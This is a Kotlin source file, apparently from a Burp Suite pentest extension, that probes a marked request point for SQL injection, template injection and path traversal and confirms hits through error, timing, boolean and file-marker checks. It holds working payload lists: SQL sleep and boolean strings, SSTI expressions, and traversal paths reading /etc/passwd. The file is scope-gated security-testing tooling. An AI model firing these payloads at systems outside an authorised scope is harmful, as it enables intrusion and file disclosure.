package io.bitbytelab.raijin.bridge

import burp.api.montoya.MontoyaApi
import io.bitbytelab.raijin.safety.BoundedHttp
import burp.api.montoya.http.HttpService
import burp.api.montoya.http.message.requests.HttpRequest
import io.bitbytelab.raijin.core.TextSimilarity
import io.bitbytelab.raijin.injection.InjectionOracle
import io.bitbytelab.raijin.safety.RequestHygiene
import io.bitbytelab.raijin.safety.ScopeGate
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

/**
 * Guided injection probe with confirmation oracles — turns raw fuzzing into
 * confirmed findings. Mark the injection point with the FUZZ keyword; for each
 * vuln class it injects class-specific payloads and confirms via
 * [InjectionOracle] (SQL error fingerprints, SSTI math-evaluation, file markers,
 * time-delay). Scope-gated. Blind/OOB classes (SSRF, blind cmdi) are out of
 * scope here — pair collaborator_* with http_fuzz for those.
 */
class InjectionBridge(private val api: MontoyaApi) {

    private val scopeGate = ScopeGate(api)

    private data class Probe(val body: String, val status: Int, val elapsedMs: Long)

    private fun send(service: HttpService, raw: String): Probe = try {
        val start = System.nanoTime()
        val result = BoundedHttp.send(api, HttpRequest.httpRequest(service, RequestHygiene.normalizeCrlf(raw)))
        val ms = (System.nanoTime() - start) / 1_000_000
        val resp = result?.response()
        Probe(resp?.bodyToString() ?: "", resp?.statusCode()?.toInt() ?: 0, ms)
    } catch (_: Exception) {
        Probe("", 0, 0)
    }

    private fun finding(cls: String, technique: String, detail: String, payload: String): JsonObject = buildJsonObject {
        put("class", cls)
        put("technique", technique)
        put("severity", "high")
        put("detail", detail)
        put("payload", payload)
    }

    /**
     * @param delaySeconds Sleep duration for time-based SQLi payloads (default 5). Raise this
     *   for a target with network jitter, a lab that only counts a longer sleep as solved, or
     *   a WAF that clamps/rate-limits short sleeps.
     */
    fun probe(request: String, host: String, port: Int, useTls: Boolean, classes: List<String>?, delaySeconds: Int = 5): JsonObject {
        scopeGate.deny((if (useTls) "https" else "http") + "://$host:$port/")?.let { return it }
        return try {
            val service = HttpService.httpService(host, port, useTls)
            val base = request.replace("\\r\\n", "\r\n").replace("\\n", "\n").replace(Regex("(?<!\r)\n"), "\r\n")
            if (!base.contains("FUZZ")) {
                return buildJsonObject { put("error", "Mark the injection point with the FUZZ keyword in the request string.") }
            }

            val active = classes?.map { it.lowercase() }?.takeIf { it.isNotEmpty() } ?: listOf("sqli", "ssti", "lfi")
            val baseline = send(service, base.replace("FUZZ", "1"))
            var probesSent = 1
            val findings = mutableListOf<JsonObject>()

            for (cls in active) {
                when (cls) {
                    "sqli" -> {
                        for (p in listOf("'", "\"", "')", "1'\"")) {
                            val r = send(service, base.replace("FUZZ", p)); probesSent++
                            val dbms = InjectionOracle.sqlError(r.body)
                            if (dbms != null) { findings.add(finding("sqli", "error-based", "SQL error signature (DBMS=$dbms) via payload $p", p)); break }
                        }
                        // Comment-truncation shapes (assume the value terminates a clause) AND
                        // concatenation-breakout shapes (assume the value sits BETWEEN two string
                        // literals, e.g. a cookie used as `... WHERE col = 'x' || :value || 'y'`)
                        // — a payload shaped for one context never reaches the sleep call in the
                        // other, so both are tried.
                        val timingPayloads = listOf(
                            "' AND SLEEP($delaySeconds)-- -", "1) AND SLEEP($delaySeconds)-- -",
                            "';WAITFOR DELAY '0:0:$delaySeconds'-- -", "' AND pg_sleep($delaySeconds)-- -",
                            "x'||pg_sleep($delaySeconds)||'", "'||pg_sleep($delaySeconds)||'",
                            "x' AND SLEEP($delaySeconds) AND 'x'='x", "x';WAITFOR DELAY '0:0:$delaySeconds'--",
                            "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',$delaySeconds) ELSE 1 END FROM dual)||'"
                        )
                        for (p in timingPayloads) {
                            val r = send(service, base.replace("FUZZ", p)); probesSent++
                            if (InjectionOracle.timeDelayed(baseline.elapsedMs, r.elapsedMs, delaySeconds)) {
                                findings.add(finding("sqli", "time-based", "response delayed ~${delaySeconds}s via $p (baseline ${baseline.elapsedMs}ms, probe ${r.elapsedMs}ms)", p)); break
                            }
                        }
                        // Boolean-differential: confirms blind SQLi when error text is suppressed
                        // and no timing payload lands (clamped sleep, rate limit, wrong insertion
                        // shape) — the only one of the four oracles that needs neither an error
                        // string nor an observable delay to work.
                        val boolPairs = listOf(
                            "' AND '1'='1" to "' AND '1'='2",
                            "' OR '1'='1" to "' OR '1'='2",
                            "x' AND '1'='1" to "x' AND '1'='2",
                            "'||('1'='1)||'" to "'||('1'='2)||'"
                        )
                        for ((truePayload, falsePayload) in boolPairs) {
                            val trueR = send(service, base.replace("FUZZ", truePayload)); probesSent++
                            val falseR = send(service, base.replace("FUZZ", falsePayload)); probesSent++
                            if (InjectionOracle.booleanDifferential(baseline.body, trueR.body, falseR.body, TextSimilarity::dice)) {
                                findings.add(
                                    finding(
                                        "sqli", "boolean-differential",
                                        "response diverges between TRUE ($truePayload) and FALSE ($falsePayload) conditions " +
                                            "— one matches the baseline, the other does not",
                                        "$truePayload | $falsePayload"
                                    )
                                )
                                break
                            }
                        }
                    }
                    "ssti" -> {
                        for (p in listOf("{{1337*1337}}", "\${1337*1337}", "<%= 1337*1337 %>", "#{1337*1337}", "\${{1337*1337}}")) {
                            val r = send(service, base.replace("FUZZ", p)); probesSent++
                            if (InjectionOracle.evaluatedTo(r.body, "1787569")) {
                                findings.add(finding("ssti", "math-eval", "template evaluated 1337*1337=1787569 via $p", p)); break
                            }
                        }
                    }
                    "lfi", "traversal" -> {
                        for (p in listOf("../../../../etc/passwd", "/etc/passwd", "....//....//....//etc/passwd", "..\\..\\..\\..\\windows\\win.ini")) {
                            val r = send(service, base.replace("FUZZ", p)); probesSent++
                            val marker = InjectionOracle.fileMarker(r.body)
                            if (marker != null) { findings.add(finding("lfi", marker, "file contents disclosed ($marker) via $p", p)); break }
                        }
                    }
                }
            }

            buildJsonObject {
                put("target", "${if (useTls) "https" else "http"}://$host:$port")
                put("classes_tested", buildJsonArray { active.forEach { add(it) } })
                put("delay_seconds", delaySeconds)
                put("probes_sent", probesSent)
                put("confirmed_count", findings.size)
                put("findings", buildJsonArray { findings.forEach { add(it) } })
                put(
                    "note",
                    "Confirmed via deterministic oracles (SQL errors, template math-eval, file markers, time delay, " +
                        "boolean-differential). FUZZ works anywhere in the raw request, including inside a header line " +
                        "such as 'Cookie: TrackingId=FUZZ'. For blind/OOB (SSRF, blind cmdi) pair collaborator_* with http_fuzz."
                )
            }
        } catch (e: Exception) {
            buildJsonObject { put("error", "Injection probe failed: ${e.message}") }
        }
    }
}
